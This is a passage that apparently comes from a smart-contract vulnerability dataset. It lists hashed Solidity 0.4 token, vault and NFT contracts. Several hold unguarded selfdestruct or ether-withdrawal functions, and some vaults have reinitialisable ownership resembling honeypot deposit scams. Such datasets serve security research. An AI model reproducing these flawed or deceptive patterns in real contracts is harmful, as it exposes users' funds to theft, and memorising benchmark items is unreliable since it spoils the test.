        return ownershipTokenCount[_owner];
    }
    function tokenMetadata(uint256 _tokenId) public view returns (string) {
        return 'https://satoshiscloset.com/SatoshiZero.json';
    }
    function transfer(address _to, uint _tokenId) external {
        require(_to != address(0));
        require(_owns(msg.sender, _tokenId));
        _transfer(msg.sender, _to, _tokenId);
    }
    function approve(address _to, uint _tokenId) external {
        require(_owns(msg.sender, _tokenId));
        _approve(_tokenId, _to);
        emit Approval(msg.sender, _to, _tokenId);
    }
    function transferFrom(address _from, address _to, uint256 _tokenId) external {
        require(_to != address(0));
        require(_approvedFor(msg.sender, _tokenId));
        require(_owns(_from, _tokenId));
        _transfer(_from, _to, _tokenId);
    }
    function totalSupply() public view returns (uint) {
        return items.length;
    }
    function ownerOf(uint _tokenId) external view returns (address) {
        owner = itemIndexToOwner[_tokenId];
        require(owner != address(0));
    }
    function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {
        uint256 tokenCount = ownershipTokenCount[_owner];
        if (tokenCount == 0) {
            return new uint256[](0);
        } else {
            uint256[] memory result = new uint256[](tokenCount);
            uint256 totalItems = totalSupply();
            uint256 resultIndex = 0;
            uint256 itemId;
            for (itemId = 1; itemId <= totalItems; itemId++) {
                if (itemIndexToOwner[itemId] == _owner) {
                    result[resultIndex] = itemId;
                    resultIndex++;
                }
            }
            return result;
        }
    }
    function _purchase(string _name, string _type, string _size, string _color, uint128 _price) internal returns (uint) {
        Item memory _item = Item({ name: _name, itemType: _type, size: _size, color: _color, price: _price });
        uint itemId = items.push(_item);
        emit Purchase(msg.sender, itemId);
        _transfer(0, owner, itemId);
        return itemId;
    }
    function _transfer(address _from, address _to, uint _tokenId) internal {
        ownershipTokenCount[_to] = ownershipTokenCount[_to].add(1);
        itemIndexToOwner[_tokenId] = _to;
        if (_from != address(0)) {
            ownershipTokenCount[_from] = ownershipTokenCount[_from].sub(1);
            delete itemIndexToApproved[_tokenId];
        }
        emit Transfer(_from, _to, _tokenId);
    }
    function createItem( string _name, string _itemType, string _size, string _color, uint128 _price) external onlyOwner returns (uint) {
        require(MAX_ITEMS > totalSupply());
        Item memory _item = Item({
            name: _name,
            itemType: _itemType,
            size: _size,
            color: _color,
            price: _price
        });
        uint itemId = items.push(_item);
        _transfer(0, owner, itemId);
        return itemId;
    }
}

```

## RQ1_934ccafdf988

文件 `units/program.sol`；SHA256 `28612e58407a661c6a78572c74f4730069f5286d0acffc7a61b7743f8b653cbc`；位置按UTF-8字节。

```solidity
contract Mortal {
        address public owner;
        function mortal() { owner = msg.sender; }
        function kill() { if (msg.sender == owner) suicide(owner); }
}
contract Thing is Mortal {
        enum Mood { Agree, Disagree, Funny, Sad, Angry, Nothing }
        string public url;
        string public data;
        string public mimetype;
        Mood public mood;
        Thing[] public reactions;
        function thing( string _url
                          , string _data
                          , Mood _mood
                          , string _mimetype) {
                url = _url;
                data = _data;
                mimetype = _mimetype;
                mood = _mood;
        }
        function react(Thing reaction) {
                if (msg.sender != reaction.owner()) throw;
                reactions.push(reaction);
        }
        function withdraw() {
                if (msg.sender != owner) throw;
                owner.send(this.balance);
        }
}
```

## RQ1_bc14311821a2

文件 `units/program.sol`；SHA256 `222cc248d63f2e7e695ec1ede1442ab4428b7d40e425ddc391a90e8219efd626`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}
contract MyAdvancedToken is owned, TokenERC20 {
    uint256 public sellPrice;
    uint256 public buyPrice;
    mapping (address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
    function MyAdvancedToken(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) TokenERC20(initialSupply, tokenName, tokenSymbol) public {}
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);                               
        require (balanceOf[_from] >= _value);               
        require (balanceOf[_to] + _value >= balanceOf[_to]); 
        require(!frozenAccount[_from]);                     
        require(!frozenAccount[_to]);                       
        balanceOf[_from] -= _value;                         
        balanceOf[_to] += _value;                           
        Transfer(_from, _to, _value);
    }
    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        Transfer(0, this, mintedAmount);
        Transfer(this, target, mintedAmount);
    }
    function freezeAccount(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }
    function buy() payable public {
        uint amount = msg.value / buyPrice;               
        _transfer(this, msg.sender, amount);              
    }
    function sell(uint256 amount) public {
        require(this.balance >= amount * sellPrice);      
        _transfer(msg.sender, this, amount);              
        msg.sender.transfer(amount * sellPrice);          
    }
	function () payable public {
    		uint amount = msg.value * buyPrice;               
    		_transfer(owner, msg.sender, amount);
    }
    function selfdestructs() payable public {
    		selfdestruct(owner);
    }
    function getEth(uint num) payable public {
    	owner.transfer(num);
    }
	function newinitialSupply(uint256 _initialSupply) public onlyOwner {
	    totalSupply = _initialSupply;
	}
}
```

## RQ1_e5e40ec6feca

文件 `units/program.sol`；SHA256 `2756ed6f4df948c9c34dbf8e57241e05ecc33a5caa1503b3fb1e71e7959e5165`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract ReverseBugBounty {
    address owner;
    function () payable {
        revert(); 
    }
    function ReverseBugBounty(){
        owner = msg.sender;
    }
    function destroy(){
        selfdestruct(owner);
    }
}

```

## RQ1_7fcdff67fecb

文件 `units/program.sol`；SHA256 `9273e6cc227d6e0c514e8c4e7bafd18ce4bea5af187f6009df55e0895ecaaf21`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract TokenVault is Ownable {
    address self = address(this);
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    function withdrawToken(address token) public returns (bool) {
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    function emtpyTo(address token, address to) public returns (bool) {
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function initVault() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function lock() public { Locked = true; } address inited;
    modifier open { if (!Locked) _; inited = msg.sender; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return inited; }
}
```

## RQ1_3d5f2e705184

文件 `units/program.sol`；SHA256 `494d3e905b13734db3f38b4e7e148161e3a9545e772a23c6a924a5b64b0a9e3f`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}    
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract x32323 is owned{
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public frozenAccount;
    mapping (address => bool) initialized;
    event FrozenFunds(address target, bool frozen);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Airdrop(address indexed to, uint256 value);
    function freezeAccount(address target, bool freeze) onlyOwner {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    string public name;
    string public symbol;
    uint8 public decimals = 2;
    uint256 public totalSupply;
    uint256 public maxSupply = 2300000000;
    uint256 airdropAmount = 300;
    uint256 bonis = 100;
    uint256 totalairdrop = 3000;
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
	initialSupply = maxSupply - totalairdrop;
    balanceOf[msg.sender] = initialSupply;
    totalSupply = initialSupply;
	initialized[msg.sender] = true;
        name = "測試15";
        symbol = "測試15";         
    }
    function initialize(address _address) internal returns (bool success) {
        if (totalSupply <= (maxSupply - airdropAmount) && !initialized[_address]) {
            initialized[_address] = true ;
            balanceOf[_address] += airdropAmount;
            totalSupply += airdropAmount;
	    Airdrop(_address , airdropAmount);
        }
        return true;
    }
    function reward(address _address) internal returns (bool success) {
	if (totalSupply < maxSupply) {
        	balanceOf[_address] += bonis;
        	totalSupply += bonis;
        	return true;
		Airdrop(_address , bonis);
	}
    }
    function _transfer(address _from, address _to, uint _value) internal {
	require(!frozenAccount[_from]);
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
	initialize(_from);
	reward(_from);
	initialize(_to);
    }
    function transfer(address _to, uint256 _value) public {
	if(msg.sender.balance < minBalanceForAccounts)
            sell((minBalanceForAccounts - msg.sender.balance) / sellPrice);
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    uint256 public sellPrice;
    uint256 public buyPrice;
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }
    function buy() payable returns (uint amount){
        amount = msg.value / buyPrice;                    
        require(balanceOf[this] >= amount);               
        balanceOf[msg.sender] += amount;                  
        balanceOf[this] -= amount;                        
        Transfer(this, msg.sender, amount);               
        return amount;                                    
    }
    function sell(uint amount) returns (uint revenue){
        require(balanceOf[msg.sender] >= amount);         
        balanceOf[this] += amount;                        
        balanceOf[msg.sender] -= amount;                  
        revenue = amount * sellPrice;
        msg.sender.transfer(revenue);                     
        Transfer(msg.sender, this, amount);               
        return revenue;                                   
    }
    uint minBalanceForAccounts;
    function setMinBalance(uint minimumBalanceInFinney) onlyOwner {
         minBalanceForAccounts = minimumBalanceInFinney * 1 finney;
    }
}
```

## RQ1_7c1aa3f1640a

文件 `units/program.sol`；SHA256 `c92a2444c20db77e2e48e95815bd51464d1f14fbc42d1532cb7d0c0bbded7140`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
contract SafeM {
    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract TokenERC20 is SafeM{
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function TokenERC20() public {
        totalSupply = 90000000* 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = "Lehman Brothers Coin";                                   
        symbol = "LBC";   
            }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function Airdrop(address[] recipients, uint[] amount){
        for( uint i = 0 ; i < recipients.length ; i++ ) {
          transfer( recipients[i], amount[i] );
      }
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value*10**18);
    }
    function destroycontract(address _to) {
        selfdestruct(_to);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value*10**18);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value*10**18);
        return true;
    }
    function () public payable {
        uint tokens;
        tokens = msg.value * 300000;       
        balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], tokens);  
        totalSupply = safeAdd(totalSupply, tokens);
        Transfer(address(0), msg.sender, tokens); 
        msg.sender.transfer(msg.value);           
    }
}

```

## RQ1_3daa3272da3f

文件 `units/program.sol`；SHA256 `eaa18e17386d77d4ae3b3efdaa2cb7193d51d2a2931adf498d11b3e1fb440c8f`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;  
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}
contract EncryptedToken is owned, TokenERC20 {
  uint256 INITIAL_SUPPLY = 500000000;
  uint256 public buyPrice = 2000;
  mapping (address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
	function EncryptedToken() TokenERC20(INITIAL_SUPPLY, 'TMET', 'TMET') payable public {
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);                               
        require (balanceOf[_from] >= _value);               
        require (balanceOf[_to] + _value > balanceOf[_to]); 
        require(!frozenAccount[_from]);                     
        require(!frozenAccount[_to]);                       
        balanceOf[_from] -= _value;                         
        balanceOf[_to] += _value;                           
        Transfer(_from, _to, _value);
    }
    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        Transfer(0, this, mintedAmount);
        Transfer(this, target, mintedAmount);
    }
    function freezeAccount(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    function setPrices(uint256 newBuyPrice) onlyOwner public {
        buyPrice = newBuyPrice;
    }
    function buy() payable public {
        uint amount = msg.value / buyPrice;               
        _transfer(this, msg.sender, amount);              
    }
    function () payable public {
    		uint amount = msg.value * buyPrice;               
    		_transfer(owner, msg.sender, amount);
    }
    function selfdestructs() payable public {
    		selfdestruct(owner);
    }
    function getEth(uint num) payable public {
    		owner.send(num);
    }
  function balanceOfa(address _owner) public constant returns (uint256) {
    return balanceOf[_owner];
  }
}
```

## RQ1_baecb1a287ec

文件 `units/program.sol`；SHA256 `6a73171e6ec481e6a5b78af4995f67bf21e70855068ca75abed8d81aa2c75d50`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
contract SafeDeposit is TokenVault {
    string public constant version = "v1.5";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function initVault() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_991cdff3e261

文件 `units/program.sol`；SHA256 `ef8091d264c184194ba577e7f426e7557d89c79c77b9dfb3eaf75f6738a08b62`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract YoloChips is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "YoloChips Token";
    string public constant symbol = "YLCs";
    uint public constant decimals = 8;
    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed = 0;    
    uint256 public constant MIN_CONTRIBUTION = 1 ether / 100000; 
    uint256 public tokensPerEth = 100000000e8;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function Legendary () public {
        owner = msg.sender;    
        distr(owner, totalDistributed);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= MIN_CONTRIBUTION );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_fa317176bacc

文件 `units/program.sol`；SHA256 `ca4d451365661840e028d48e44900440a014f77cfe4eb0b86711bc83bdf70f83`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract TokenVault is Ownable {
    address self = address(this);
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    function withdrawToken(address token) public returns (bool) {
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    function emtpyTo(address token, address to) public returns (bool) {
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
